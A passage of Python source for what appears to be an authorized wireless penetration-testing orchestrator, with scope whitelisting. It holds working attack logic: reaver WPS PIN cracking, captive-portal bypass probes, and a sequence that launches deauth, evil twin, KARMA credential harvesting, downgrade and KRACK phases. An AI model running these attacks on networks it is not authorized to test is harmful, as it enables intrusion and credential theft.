            chan_m  = re.search(r"DS Parameter set:\s+channel\s+(\d+)", block)
            if bssid_m:
                entry = {
                    "bssid": bssid_m.group(1),
                    "ssid": ssid_m.group(1) if ssid_m else "",
                    "channel": int(chan_m.group(1)) if chan_m else 0,
                }
                if entry["bssid"] not in {d["bssid"] for d in p2p_devices}:
                    p2p_devices.append(entry)

    if p2p_devices:
        (p2p_dir / "p2p_devices.json").write_text(
            json.dumps(p2p_devices, indent=2), encoding="utf-8"
        )
        scoped   = [d for d in p2p_devices if _in_scope(d)]
        unscoped = [d for d in p2p_devices if not _in_scope(d)]
        if unscoped:
            labels = ", ".join(d.get("ssid") or d["bssid"] for d in unscoped)
            log(f"Phase 11b: {len(unscoped)} P2P device(s) out of scope — skipped: {labels}")
        log(f"Phase 11b: {len(scoped)} in-scope Wi-Fi Direct device(s) to test "
            f"({len(p2p_devices)} total discovered)")
        for device in scoped:
            bssid   = device["bssid"]
            ssid    = device.get("ssid", "")
            channel = device.get("channel", 6) or 6
            log(f"Phase 11b: Attempting WPS PIN attack on {ssid!r} [{bssid}]")
            reaver = shutil.which("reaver")
            if reaver:
                out, rc = _run(
                    [reaver, "-i", monitor_iface, "-b", bssid,
                     "-c", str(channel), "-S", "-N", "-d", "1",
                     "-t", "5", "-vv"],
                    timeout=min(timeout, 120),
                )
                (p2p_dir / f"reaver_{bssid.replace(':','')}.txt").write_text(
                    out, encoding="utf-8"
                )
                if re.search(r"WPS PIN|WPA PSK|pin found", out, re.I):
                    finding_from_cat(
                        "wifidirect_wps_cracked",
                        data={"bssid": bssid, "ssid": ssid},
                        output_file=str(p2p_dir / f"reaver_{bssid.replace(':','')}.txt"),
                        title_override=f"Wi-Fi Direct WPS PIN Obtained: {ssid} [{bssid}]",
                    )
                    log(f"Phase 11b: WPS PIN obtained for {ssid!r}")
            finding_from_cat(
                "wifidirect_found",
                data={"bssid": bssid, "ssid": ssid, "channel": channel},
                output_file=str(p2p_dir / "p2p_devices.json"),
                title_override=f"Wi-Fi Direct / P2P Device Discovered: {ssid or bssid}",
            )
    else:
        log("Phase 11b: No Wi-Fi Direct / P2P devices found.")
    status("p11_wifidirect", "Phase 11b: Wi-Fi Direct / P2P WPS Scanning", "complete")

    # ── 11c: Captive Portal Bypass ────────────────────────────────────────────
    # All bypass tests are EXPLICITLY BOUND to the wireless interface under
    # test (managed_iface).  Without binding, the OS routing table picks
    # egress and tests run via eth0/tun0 on appliances — producing false-
    # positive "bypass succeeded" findings that have nothing to do with
    # the wireless captive portal.
    #
    # Each successful method emits its own finding with per-method severity
    # (CVSS-based, not a one-size HIGH).  A parent summary finding
    # (captive_bypass / AETHER-034) collates them so consumers see both
    # per-method detail AND a single "captive portal hardening" rollup.
    status("p11_captive", "Phase 11c: Captive Portal Bypass Testing", "running")
    cp_dir = lg_dir / "captive_bypass"
    cp_dir.mkdir(exist_ok=True)

    if not managed_iface:
        log("Phase 11c: SKIPPED — no managed-mode wireless interface available "
            "(would have tested via OS-default route, producing false positives)")
        (cp_dir / "bypass_results.json").write_text(
            json.dumps({"skipped": True,
                        "reason": "no managed-mode iface"}, indent=2),
            encoding="utf-8")
        status("p11_captive", "Phase 11c: Captive Portal Bypass Testing",
               "skipped", "no managed iface")
        status("p11_legacy", "Phase 11: Legacy / Niche Attacks", "complete")
        return

    iface_ip   = _get_iface_ip(managed_iface, family=4)
    iface_ip6  = _get_iface_ip(managed_iface, family=6)

    if not iface_ip and not iface_ip6:
        log(f"Phase 11c: SKIPPED — interface {managed_iface!r} has no IP "
            "(not associated to any AP).  Captive portal bypass tests "
            "require the test host to be associated to the open SSID "
            "under test.")
        (cp_dir / "bypass_results.json").write_text(
            json.dumps({"skipped": True,
                        "reason": f"iface {managed_iface} has no IPv4/IPv6"},
                       indent=2),
            encoding="utf-8")
        status("p11_captive", "Phase 11c: Captive Portal Bypass Testing",
               "skipped", f"{managed_iface} has no IP")
        status("p11_legacy", "Phase 11: Legacy / Niche Attacks", "complete")
        return

    log(f"Phase 11c: binding all tests to {managed_iface} "
        f"(IPv4={iface_ip or '—'}, IPv6={iface_ip6 or '—'})")

    bypass_results = []

    def _record(test_id: str, name: str, success: bool, detail: str,
                cat_id: str = "", target: str = "") -> None:
        rec = {"test": test_id, "name": name, "target": target,
               "success": success, "detail": detail, "iface": managed_iface,
               "src_ip": iface_ip or "", "src_ip6": iface_ip6 or ""}
        bypass_results.append(rec)
        log(f"Phase 11c [{name}]: {'PASS' if success else 'FAIL'} — {detail}")
        # Per-method finding emission for each successful bypass.  Each
        # catalogue entry carries its own risk + CVSS appropriate to the
        # method (see Phase 4 catalogue additions in 1.17.0).
        if success and cat_id:
            finding_from_cat(
                cat_id,
                data={**rec, "method": test_id},
                output_file=str(cp_dir / "bypass_results.json"),
            )

    # ─── Method 1: External DNS resolution pre-auth ─────────────────────
    # Foundation for DNS tunneling.  If unauthenticated clients can resolve
    # arbitrary names via external resolvers, an attacker can run iodine /
    # dnscat2 for full-duplex tunnel.  HIGH per AETHER-CAP-DNS-EXTERNAL.
    if iface_ip and shutil.which("dig"):
        out, rc = _run(["dig", *_dig_iface_args(iface_ip),
                        "+time=3", "+tries=1", "@1.1.1.1", "one.one.one.one"],
                       timeout=10)
        success = (rc == 0 and "NOERROR" in out and "ANSWER SECTION" in out)
        _record("dns_external", "External DNS pre-auth", success,
                ("DNS to 1.1.1.1 resolved one.one.one.one — captive portal "
                 "is not blocking outbound DNS")
                if success else "DNS blocked or non-NOERROR response",
                cat_id="AETHER-CAP-DNS-EXTERNAL" if success else "",
                target="1.1.1.1")

    # ─── Method 2: DNS tunneling viability ──────────────────────────────
    # Long random subdomains (tunneling pattern) resolved → tunneling viable.
    # CRITICAL per AETHER-CAP-DNS-TUNNEL.
    if iface_ip and shutil.which("dig"):
        import random as _r, string as _s
        rand_sub = "".join(_r.choices(_s.ascii_lowercase + _s.digits, k=40))
        probe = f"{rand_sub}.invalid-tunnel-probe.example.com"
        out, rc = _run(["dig", *_dig_iface_args(iface_ip),
                        "+time=3", "+tries=1", "@1.1.1.1", probe],
                       timeout=10)
        # Look for ANY answer (even NXDOMAIN counts as "resolver reached")
        # vs SERVFAIL or timeout (resolver unreachable / blocked).
        reached_resolver = (rc == 0 and
                            ("NOERROR" in out or "NXDOMAIN" in out))
        _record("dns_tunnel", "DNS tunneling viability", reached_resolver,
                ("Long random-subdomain query reached external resolver "
                 "— DNS tunneling tools (iodine, dnscat2) can establish "
                 "a full-duplex tunnel through this captive portal")
                if reached_resolver else "Long DNS query blocked",
                cat_id="AETHER-CAP-DNS-TUNNEL" if reached_resolver else "",
                target=probe)

    # ─── Method 3: Direct HTTP to arbitrary IP ──────────────────────────
    if iface_ip and shutil.which("curl"):
        out, rc = _run(["curl", *_curl_iface_args(managed_iface),
                        "-sS", "-o", "/dev/null", "-w", "%{http_code}",
                        "-m", "5", "--connect-timeout", "3",
                        "http://1.1.1.1/"], timeout=10)
        code = (out or "").strip()
        success = code.isdigit() and int(code) < 400
        _record("http_direct", "Direct HTTP to arbitrary IP", success,
                f"HTTP {code} — direct internet HTTP without portal redirect"
                if success else f"HTTP blocked (got {code or 'timeout'})",
                cat_id="AETHER-CAP-HTTP-DIRECT" if success else "",
                target="http://1.1.1.1/")

    # ─── Method 4: Direct HTTPS to arbitrary IP ─────────────────────────
    if iface_ip and shutil.which("curl"):
        out, rc = _run(["curl", *_curl_iface_args(managed_iface),
                        "-sSk", "-o", "/dev/null", "-w", "%{http_code}",
                        "-m", "5", "--connect-timeout", "3",
                        "https://1.1.1.1/"], timeout=10)
        code = (out or "").strip()
        success = code.isdigit() and int(code) < 400
        _record("https_direct", "Direct HTTPS to arbitrary IP", success,
                f"HTTPS {code} — direct internet HTTPS without portal interception"
                if success else f"HTTPS blocked (got {code or 'timeout'})",
                cat_id="AETHER-CAP-HTTPS-DIRECT" if success else "",
                target="https://1.1.1.1/")

    # ─── Method 5: IPv6 dual-stack bypass ───────────────────────────────
    # Many captive portals only filter IPv4 — IPv6 traffic egresses fully.
    # HIGH per AETHER-CAP-IPV6.
    if iface_ip6 and shutil.which("curl"):
        out, rc = _run(["curl", *_curl_iface_args(managed_iface),
                        "-6", "-sSk", "-o", "/dev/null", "-w", "%{http_code}",
                        "-m", "5", "--connect-timeout", "3",
                        "https://[2606:4700:4700::1111]/"], timeout=10)
        code = (out or "").strip()
        success = code.isdigit() and int(code) < 400
        _record("ipv6_bypass", "IPv6 dual-stack bypass", success,
                f"IPv6 HTTPS {code} — captive portal does not filter v6 traffic "
                "(common misconfiguration: portal only blocks v4)"
                if success else f"IPv6 traffic blocked (got {code or 'timeout'})",
                cat_id="AETHER-CAP-IPV6" if success else "",
                target="https://[2606:4700:4700::1111]/")
    elif iface_ip and not iface_ip6:
        _record("ipv6_bypass", "IPv6 dual-stack bypass", False,
                "Interface has no IPv6 — bypass not testable",
                cat_id="", target="")

    (cp_dir / "bypass_results.json").write_text(
        json.dumps(bypass_results, indent=2), encoding="utf-8")
    bypasses = [r for r in bypass_results if r["success"]]
    if bypasses:
        # Parent summary finding — collates the per-method findings into
        # a single "Captive Portal Hardening" entry sized to the worst-
        # severity individual method.  Risk taken from catalogue (MEDIUM
        # for the generic AETHER-034 / captive_bypass entry) — individual
        # method findings carry their own (per-method) severity.
        finding_from_cat(
            "captive_bypass",
            data={"bypasses": bypasses,
                  "iface":         managed_iface,
                  "iface_ip":      iface_ip or "",
                  "iface_ip6":     iface_ip6 or ""},
            output_file=str(cp_dir / "bypass_results.json"),
            title_override=(f"Captive Portal Hardening: "
                            f"{len(bypasses)} bypass method(s) succeeded"),
        )
    status("p11_captive", "Phase 11c: Captive Portal Bypass Testing", "complete")

    log("[11] END: Legacy / Niche Attacks complete")
    status("p11_legacy", "Phase 11: Legacy / Niche Attacks", "complete")

# ── Main orchestrator ─────────────────────────────────────────────────────────

def run(config: dict, project: str) -> None:
    global _scope_bssids, _scope_ssids, _scope_modes, _scope_default_mode, _RUN_DIR

    output_dir = Path(project) / config.get("output_dir", "aether_output")
    output_dir.mkdir(parents=True, exist_ok=True)
    _RUN_DIR = output_dir

    # Generated wordlists (SSID-seeded, domain-derived, website-scraped,
    # multi-source merges) land in <project>/wordlists/ instead of /tmp/
    # so they're preserved alongside the rest of the run evidence.
    _set_project_wordlist_dir(Path(project) / "wordlists")
    _set_aether_run_dir(project)   # §14/§13c: per-invocation tool .logs + relative evidence

    interface     = config.get("interface", "wlan0")
    monitor_iface = config.get("monitor_interface", "wlan0mon")
    target_ssids  = config.get("target_ssids", [])
    target_bssids = config.get("target_bssids", [])
    wordlist      = config.get("wordlist")
    domains       = config.get("domains", [])
    phases_cfg    = config.get("phases", {})
    tools         = config.get("tools", {})
    timeout       = config.get("timeout_per_phase", 300)
    scan_channel  = config.get("scan_channel")
    hashcat_rules = config.get("hashcat_rules", [])
    asleap_path   = config.get("asleap_path", "")
    scrape_url         = (config.get("scrape_url") or "").strip()
    scrape_depth       = int(config.get("scrape_depth", 4))
    intel_scan_seconds = int(config.get("intel_scan_seconds", 45))
    deauth_packets     = int(config.get("deauth_packets", 5))
    rogue_cfg          = config.get("rogue_ap", {})
    post_cfg           = config.get("post_connection", {})

    # Scope enforcement
    scope_cfg    = config.get("scope", {})
    _scope_bssids = {b.upper() for b in scope_cfg.get("bssids", [])}
    _scope_ssids  = set(scope_cfg.get("ssids", []))
    if _scope_bssids or _scope_ssids:
        log(f"Scope: {len(_scope_bssids)} BSSID(s), {len(_scope_ssids)} SSID(s) in whitelist")
    _scope_modes = scope_cfg.get("modes", {})
    _scope_default_mode = scope_cfg.get("default_mode", "active")
    if _scope_modes:
        passive_count = sum(1 for m in _scope_modes.values() if m == "passive")
        log(f"Scope modes: {len(_scope_modes)} SSID(s) configured "
            f"({passive_count} passive), default={_scope_default_mode}")

    client_name  = config.get("client_name", "")
    client_short = config.get("client_short", "")

    log("=" * 60)
    log("AUTHORIZED USE ONLY. Explicit written permission from the")
    log("network owner is required before any wireless assessment.")
    log("=" * 60)
    log(f"Aether Wireless Penetration Testing Orchestrator v{VERSION}")
    if client_name:
        log(f"Client   : {client_name}" + (f" ({client_short})" if client_short else ""))
    log(f"Project  : {project}")
    log(f"Interface: {interface}")
    log(f"Targets  : {', '.join(target_ssids) if target_ssids else '(all in-scope)'}")
    log("=" * 60)

    _check_privileges()
    if not _check_interface(interface):
        err(f"Aborting: interface '{interface}' not available.")
        return

    # ── Plugin updates ───────────────────────────────────────────────────
    _bc_bin = shutil.which("bettercap")
    if _bc_bin:
        log("[*] Updating bettercap caplets…")
        try:
            subprocess.run(
                [_bc_bin, "-eval", "caplets.update; quit"],
                capture_output=True, text=True, timeout=120)
            log("[+] bettercap caplets updated.")
        except subprocess.TimeoutExpired:
            log("[~] bettercap caplets update timed out — continuing.")
        except Exception as _e:
            log(f"[~] bettercap caplets update skipped: {_e}")

    # Build wordlists before phases start
    # Stack order: base list(s) → website scrape → domain derivation
    # When multiple base wordlists are given (list[str]) they are merged into one
    # deduplicated file first. The merged base is then extended by the targeted
    # scrape/domain mutations as before.
    if isinstance(wordlist, list):
        _effective_wl = _concat_wordlists(wordlist)
        log(f"Base wordlist(s) merged: {len(wordlist)} sources → {_effective_wl}")
    else:
        _effective_wl = wordlist
    if scrape_url:
        _scraped = _build_website_wordlist(scrape_url, scrape_depth, _effective_wl)
        if _scraped:
            log(f"Website wordlist active: {_scraped}")
            _effective_wl = _scraped
    _effective_wl = _build_domain_wordlist(domains, _effective_wl)
    if _effective_wl and _effective_wl != wordlist:
        log(f"Effective wordlist for cracking: {_effective_wl}")

    active_monitor = enable_monitor_mode(interface, monitor_iface)

    try:
        _check_injection(active_monitor)

        # Phase 0-I: Wireless Intelligence — enumerate all APs broadcasting the
        # target SSID, identify connected clients, score and select best target.
        best_ap, enriched_aps = phase_wireless_intel(
            active_monitor, target_ssids, target_bssids, output_dir,
            scan_seconds=intel_scan_seconds,
        )

        # Phase 0-II: Contextual Intelligence — emit informational findings
        # for every observed AP, client, vendor, channel, and authentication
        # type so the engagement report has full attribution regardless of
        # which risk-graded findings any subsequent phase produces.
        if phases_cfg.get("contextual_intel", True):
            phase_contextual_intel(enriched_aps, output_dir)

        # Phase 0-III: Meraki Infrastructure Recon — classify APs, identify
        # shared-physical-AP multi-SSID deployments, fingerprint firmware.
        if phases_cfg.get("meraki_recon", True):
            phase_meraki_recon(enriched_aps, output_dir)

        # Narrow subsequent phases to the best-scored AP when user has not
        # specified an explicit BSSID — reduces false-positive capture and
        # avoids attacking out-of-scope BSSIDs.
        effective_bssids = list(target_bssids)
        if not effective_bssids and best_ap:
            effective_bssids = [best_ap["bssid"]]
            log(f"Best target selected: {best_ap.get('ssid','')!r} "
                f"[{best_ap['bssid']}] score={best_ap['score']}")

        target_aps = scan_targets(
            active_monitor, target_ssids, effective_bssids,
            timeout=30, channel=scan_channel,
        )

        active_aps = [ap for ap in target_aps if _is_active_scope(ap)]
        active_enriched = [ap for ap in enriched_aps if _is_active_scope(ap)]
        passive_only = [ap for ap in target_aps if not _is_active_scope(ap)]
        if passive_only:
            passive_ssids = sorted(set(ap.get("ssid", "?") for ap in passive_only))
            log(f"Passive-scope SSIDs (monitoring only, no client attacks): "
                f"{', '.join(passive_ssids)}")

        if _PAUSE and _PAUSE.check_and_pause(): sys.exit(_pp.EXIT_PAUSED)

        if phases_cfg.get("wep", True):
            log("[orchestrator] Phase 0 (WEP) — enabled, running")
            phase_wep(active_monitor, target_aps, output_dir, timeout)
        else:
            log("[orchestrator] Phase 0 (WEP) — disabled in config, skipping")

        if _PAUSE and _PAUSE.check_and_pause(): sys.exit(_pp.EXIT_PAUSED)

        if phases_cfg.get("pmkid", True):
            log("[orchestrator] Phase 1a (PMKID) — enabled, running clientless capture")
            phase_pmkid(active_monitor, target_aps, output_dir,
                        timeout=min(timeout, 120), wordlist=_effective_wl,
                        hashcat_rules=hashcat_rules)
        else:
            log("[orchestrator] Phase 1a (PMKID) — disabled in config, skipping")

        if _PAUSE and _PAUSE.check_and_pause(): sys.exit(_pp.EXIT_PAUSED)

        if phases_cfg.get("pmkid_roam", False):
            log("[orchestrator] Phase 1c (PMKID Roam) — enabled, capturing FT roam events")
            phase_pmkid_roam(active_monitor, target_aps, output_dir,
                              timeout=min(timeout, 300),
                              wordlist=_effective_wl,
                              hashcat_rules=hashcat_rules)
        else:
            log("[orchestrator] Phase 1c (PMKID Roam) — disabled (default off), skipping")

        if _PAUSE and _PAUSE.check_and_pause(): sys.exit(_pp.EXIT_PAUSED)

        if phases_cfg.get("wpa_handshake", True):
            _active_ssids = [s for s in target_ssids
                             if _scope_modes.get(s, _scope_default_mode) == "active"]
            if not _active_ssids and target_ssids:
                log("[orchestrator] Phase 1b (wifite2) — skipped: all target SSIDs are passive scope")
            else:
                log("[orchestrator] Phase 1b (wifite2) — enabled, running WPA/WPS attacks")
                phase_wifite(
                    active_monitor, _active_ssids or target_ssids, effective_bssids,
                    active_enriched, _effective_wl, output_dir, timeout,
                )

        if _PAUSE and _PAUSE.check_and_pause(): sys.exit(_pp.EXIT_PAUSED)

        if phases_cfg.get("deauth_handshake", True):
            if not active_enriched and enriched_aps:
                log("[orchestrator] Phase 1c (Deauth+Handshake) — skipped: all APs are passive scope")
            else:
                log("[orchestrator] Phase 1c (Deauth+Handshake) — enabled, targeting APs with clients")
                phase_deauth_handshake(
                    active_monitor, active_enriched, output_dir,
                    _effective_wl, timeout, deauth_packets,
                )

        if _PAUSE and _PAUSE.check_and_pause(): sys.exit(_pp.EXIT_PAUSED)

        if phases_cfg.get("wpa_enterprise", False):
            if not active_aps and target_aps:
                log("[orchestrator] Phase 2 (EAPHammer) — skipped: all APs are passive scope")
            else:
                log("[orchestrator] Phase 2 (EAPHammer) — enabled, testing WPA-Enterprise")
                phase_eaphammer(
                    active_monitor, active_aps,
                    tools.get("eaphammer", "/opt/eaphammer/eaphammer"),
                    output_dir,
                    auth=config.get("eaphammer", {}).get("auth", "wpa-eap"),
                    timeout=timeout,
                    asleap_path=asleap_path,
                )

        if _PAUSE and _PAUSE.check_and_pause(): sys.exit(_pp.EXIT_PAUSED)

        if phases_cfg.get("dragonblood_sae", True):
            log("[orchestrator] Phase 3 (dragonslayer) — enabled, testing WPA3 SAE cryptography")
            ds_cfg = config.get("dragonslayer", {})
            phase_dragonslayer(
                active_monitor, target_aps,
                tools.get("dragonslayer_client",
                           "/opt/dragonslayer/dragonslayer-client.sh"),
                output_dir,
                attack=ds_cfg.get("attack", 1),
                client_conf=ds_cfg.get("client_conf", ""),
                timeout=timeout,
            )

        if _PAUSE and _PAUSE.check_and_pause(): sys.exit(_pp.EXIT_PAUSED)

        if phases_cfg.get("dragonblood_drain", False):
            log("[orchestrator] Phase 4 (dragondrain) — enabled, testing SAE resource exhaustion")
            phase_dragondrain(
                active_monitor, target_aps,
                tools.get("dragondrain",
                           "/opt/dragondrain-and-time/dragondrain"),
                output_dir, timeout=60,
            )

        # Collect any PSKs cracked in earlier phases for use by the rogue AP
        cracked_psks = _collect_cracked_psks(output_dir)

        if _PAUSE and _PAUSE.check_and_pause(): sys.exit(_pp.EXIT_PAUSED)

        if phases_cfg.get("rogue_ap", False):
            if not active_aps and target_aps:
                log("[orchestrator] Phase 6a (Rogue AP) — skipped: all APs are passive scope")
            else:
                log("[orchestrator] Phase 6a (Rogue AP) — enabled, deploying Evil Twin")
                phase_rogue_ap(
                    active_monitor, interface, active_aps, active_enriched,
                    output_dir, rogue_cfg, timeout, cracked_psks,
                )

        if _PAUSE and _PAUSE.check_and_pause(): sys.exit(_pp.EXIT_PAUSED)

        if phases_cfg.get("karma", False):
            if _scope_default_mode == "passive" and not active_aps:
                log("[orchestrator] Phase 6b (KARMA) — skipped: all APs are passive scope")
            else:
                log("[orchestrator] Phase 6b (KARMA) — enabled, running credential harvesting")
                phase_karma(
                    active_monitor, interface, output_dir, rogue_cfg, timeout,
                )

        if _PAUSE and _PAUSE.check_and_pause(): sys.exit(_pp.EXIT_PAUSED)

        if phases_cfg.get("mana_loud", False):
            if _scope_default_mode == "passive" and not active_aps:
                log("[orchestrator] Phase 6c (MANA Loud) — skipped: all APs are passive scope")
            else:
                log("[orchestrator] Phase 6c (MANA Loud) — enabled, running beacon spam")
                phase_mana_loud(
                    active_monitor, interface, output_dir, rogue_cfg, timeout,
                )

        if _PAUSE and _PAUSE.check_and_pause(): sys.exit(_pp.EXIT_PAUSED)

        if phases_cfg.get("client_attacks", True):
            if not active_aps and target_aps:
                log("[orchestrator] Phase 7 (Client Attacks) — skipped: all APs are passive scope")
            else:
                log("[orchestrator] Phase 7 (Client Attacks) — enabled, testing PMF/BTM/probes")
                phase_client_attacks(
                    active_monitor, active_aps, active_enriched, output_dir, timeout,
                )

        if _PAUSE and _PAUSE.check_and_pause(): sys.exit(_pp.EXIT_PAUSED)

        if phases_cfg.get("eap_downgrade", False):
            if not active_aps and target_aps:
                log("[orchestrator] Phase 8 (EAP Downgrade) — skipped: all APs are passive scope")
            else:
                log("[orchestrator] Phase 8 (EAP Downgrade) — enabled, testing weak EAP methods")
                phase_eap_downgrade(
                    active_monitor, active_aps,
                    tools.get("eaphammer", "/opt/eaphammer/eaphammer"),
                    output_dir, timeout,
                )

        if _PAUSE and _PAUSE.check_and_pause(): sys.exit(_pp.EXIT_PAUSED)

        if phases_cfg.get("eap_fast_anon", False):
            if not active_aps and target_aps:
                log("[orchestrator] Phase 8b (EAP-FAST) — skipped: all APs are passive scope")
            else:
                log("[orchestrator] Phase 8b (EAP-FAST) — enabled, testing anonymous PAC provisioning")
                phase_eap_fast_anon(
                    active_monitor, active_aps,
                    tools.get("eaphammer", "/opt/eaphammer/eaphammer"),
                    output_dir, timeout,
                )

        if _PAUSE and _PAUSE.check_and_pause(): sys.exit(_pp.EXIT_PAUSED)

        if phases_cfg.get("sae_downgrade", False):
            if not active_aps and target_aps:
                log("[orchestrator] Phase 9 (SAE Downgrade) — skipped: all APs are passive scope")
            else:
                log("[orchestrator] Phase 9 (SAE Downgrade) — enabled, testing WPA3/WPA2 transition mode")
                phase_sae_downgrade(
                    active_monitor, interface, active_aps, active_enriched,
                    output_dir, rogue_cfg, timeout,
                )

        if _PAUSE and _PAUSE.check_and_pause(): sys.exit(_pp.EXIT_PAUSED)

        if phases_cfg.get("legacy_attacks", True):
            if not active_aps and target_aps:
                log("[orchestrator] Phase 11 (Legacy) — skipped: all APs are passive scope")
            else:
                log("[orchestrator] Phase 11 (Legacy) — enabled, running TKIP/WPS/captive bypass")
                phase_legacy_attacks(
                    active_monitor, active_aps, active_enriched, output_dir,
                    tools, timeout,
                    managed_iface=interface,
                )

        # Phase 0-IV-VII: Cert/iPSK/captive-portal/identity analysis —
        # run AFTER capture-producing phases (wifite, deauth-handshake,
        # eaphammer) so the analysis has pcaps to parse.
        if _PAUSE and _PAUSE.check_and_pause(): sys.exit(_pp.EXIT_PAUSED)

        if phases_cfg.get("server_cert_analysis", True):
            log("[orchestrator] Phase 0-IV (Cert Analysis) — enabled, analyzing captured EAP-TLS certs")
            phase_server_cert_analysis(target_aps, output_dir, timeout=60)

        if _PAUSE and _PAUSE.check_and_pause(): sys.exit(_pp.EXIT_PAUSED)

        if phases_cfg.get("ipsk_test", True):
            log("[orchestrator] Phase 0-V (iPSK) — enabled, detecting Meraki per-client PSK")
            phase_ipsk_test(active_monitor, interface, enriched_aps,
                            output_dir, timeout=120)

        if _PAUSE and _PAUSE.check_and_pause(): sys.exit(_pp.EXIT_PAUSED)

        if phases_cfg.get("captive_portal_test", True):
            log("[orchestrator] Phase 0-VI (Captive Portal) — enabled, testing splash bypass")
            phase_captive_portal_test(target_aps, output_dir,
                                       primary_iface=interface, timeout=60)

        if _PAUSE and _PAUSE.check_and_pause(): sys.exit(_pp.EXIT_PAUSED)

        if phases_cfg.get("eaptls_identity_analysis", True):
            log("[orchestrator] Phase 0-VII (EAP Identity) — enabled, parsing EAPOL for leaked identities")
            phase_eaptls_identity_analysis(output_dir, timeout=30)

        if _PAUSE and _PAUSE.check_and_pause(): sys.exit(_pp.EXIT_PAUSED)

        if phases_cfg.get("post_connection", False):
            if not active_aps and target_aps:
                log("[orchestrator] Phase 10 (Post-Connection) — skipped: all APs are passive scope")
            else:
                log("[orchestrator] Phase 10 (Post-Connection) — enabled, running ARP/LLMNR/nmap")
                _ap_iface = (rogue_cfg.get("ap_interface") or "").strip()
                if not _ap_iface:
                    _ap_iface = _find_ap_interface([interface, active_monitor])
                phase_post_connection(_ap_iface, output_dir, post_cfg, timeout)

    finally:
        disable_monitor_mode(active_monitor, interface)
        # Clean up domain-derived temp wordlist — preserve project-dir
        # files (evidence per the universal output structure).
        if (_effective_wl and _effective_wl != wordlist
                and not _is_project_wordlist(_effective_wl)):
            try:
                os.unlink(_effective_wl)
            except Exception:
                pass

    if _PAUSE and _PAUSE.check_and_pause(): sys.exit(_pp.EXIT_PAUSED)

    # KRACK runs after monitor mode is disabled — it needs wlan0 in managed
    # mode; running it while the interface is wlan0mon causes hostapd/scapy
    # to fail with "Interface not found".
    if phases_cfg.get("krack", True):
        if not active_aps and target_aps:
            log("[orchestrator] Phase 5 (KRACK) — skipped: all APs are passive scope")
        else:
            log("[orchestrator] Phase 5 (KRACK) — enabled, testing key reinstallation")
            phase_krack(
                interface, active_aps,
                tools.get("krackattacks",
                           "/opt/krackattacks-scripts/krackattack/krack-test-client.py"),
                output_dir, timeout=timeout,
            )

    save_findings(output_dir)

    if _PAUSE:
        _PAUSE.write_stop_reason("completed", "all_phases_done")

    meta = {
        "version": VERSION,
        "project": project,
        "interface": interface,
        "target_ssids": target_ssids,
        "target_bssids": target_bssids,
        "scope": scope_cfg,
        "phases_run": phases_cfg,
        "output_dir": str(output_dir),
        "completed_at": datetime.now().isoformat(),
        "findings_count": len(_findings_collected),
    }
    (output_dir / "assessment_meta.json").write_text(
        json.dumps(meta, indent=2), encoding="utf-8"
    )
    log(f"Assessment complete — output: {output_dir}")
    status("complete", "Assessment Complete", "complete", str(output_dir))


# ── CLI ───────────────────────────────────────────────────────────────────────

def parse_args():
    _default_cfg     = str(Path(__file__).parent / "config.json")
    _default_project = ""  # computed at runtime from config fields

    parser = argparse.ArgumentParser(
        prog="aether",
        description="Aether — Wireless Penetration Testing Orchestrator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 aether.py --config config.json --project my_pentest
  python3 aether.py --phase pmkid --interface wlan1 --project quick_test
  python3 aether.py --list-phases
""",
    )
    parser.add_argument("--config", "-c", default=_default_cfg,
                        help="JSON config file (default: next to aether.py)")
    parser.add_argument("--project", "-p", default=_default_project,
                        help="Project name / output root directory")
    parser.add_argument("--interface", "-i",
                        help="Wireless interface (overrides config)")
    parser.add_argument("--phase",
                        choices=["wep", "pmkid", "wpa", "enterprise",
                                 "wpa3", "drain", "krack", "rogue",
                                 "karma", "client", "eap-downgrade",
                                 "sae-downgrade", "post", "legacy"],
                        help="Run a single phase only")
    parser.add_argument("--ssid", action="append", dest="ssids", metavar="SSID",
                        help="Target SSID (repeatable; overrides config)")
    parser.add_argument("--bssid", action="append", dest="bssids", metavar="BSSID",
                        help="Target BSSID (repeatable; overrides config)")
    parser.add_argument("--channel", "-C", type=int,
                        help="Lock scan to this channel")
    parser.add_argument("--timeout", "-t", type=int,
                        help="Per-phase timeout seconds")
    parser.add_argument("--wordlist", "-w", action="append", dest="wordlists",
                        metavar="WORDLIST",
                        help="Wordlist for WPA cracking (repeatable; multiple lists are "
                             "concatenated and deduplicated into a single base wordlist)")
    parser.add_argument("--scope-bssid", action="append", dest="scope_bssids",
                        metavar="BSSID",
                        help="Scope whitelist BSSID (repeatable); attacks blocked outside scope")
    parser.add_argument("--scope-ssid", action="append", dest="scope_ssids",
                        metavar="SSID",
                        help="Scope whitelist SSID (repeatable)")
    parser.add_argument("--scope-active", action="append", dest="scope_active_ssids",
                        metavar="SSID",
                        help="SSID in active scope — full testing (repeatable)")
    parser.add_argument("--scope-passive", action="append", dest="scope_passive_ssids",
                        metavar="SSID",
                        help="SSID in passive scope — monitoring only (repeatable)")
    parser.add_argument("--scope-default-mode", dest="scope_default_mode",
                        choices=["active", "passive"], default=None,
                        help="Default scope mode for unlisted SSIDs (default: active)")
    parser.add_argument("--domain", action="append", dest="domains",
                        metavar="DOMAIN",
                        help="Domain to deep-parse into wordlist entries (repeatable); "
                             "merged with base wordlist for all password phases")
    parser.add_argument("--rules", action="append", dest="hashcat_rules",
                        metavar="RULE_FILE",
                        help="Hashcat rule file for staged PMKID cracking (repeatable)")
    parser.add_argument("--list-phases", action="store_true",
                        help="List available phases and exit")
    return parser.parse_args()


def _startup_tool_check() -> None:
    """Warn about missing tools at startup. On Linux, exits if the
    core aircrack-ng suite is missing since no phases can run without it."""
    if platform.system() != "Linux":
        return  # macOS support is limited — skip full check
    CRITICAL = ["airmon-ng", "airodump-ng", "aircrack-ng", "aireplay-ng"]
    IMPORTANT = ["hcxdumptool", "hcxpcapngtool", "hashcat", "wash", "asleap",
                 "hostapd", "dnsmasq", "nmap", "responder"]
    missing_critical  = [t for t in CRITICAL  if not shutil.which(t)]
    missing_important = [t for t in IMPORTANT if not shutil.which(t)]
    if missing_critical or missing_important:
        print("[!] Aether startup tool check:", file=sys.stderr)
    for t in missing_critical:
        print(f"    MISSING (critical) : {t}  — install aircrack-ng suite",
              file=sys.stderr)
    for t in missing_important:
        print(f"    MISSING (important): {t}  — run: sudo python3 install.py",
              file=sys.stderr)
    if missing_critical:
        print("[!] Cannot continue without the aircrack-ng suite.\n", file=sys.stderr)
        sys.exit(1)


# ═══════════════════════════════════════════════════════════════════════════
# v1.12 — Certificate-auth / Meraki / contextual-intel additions
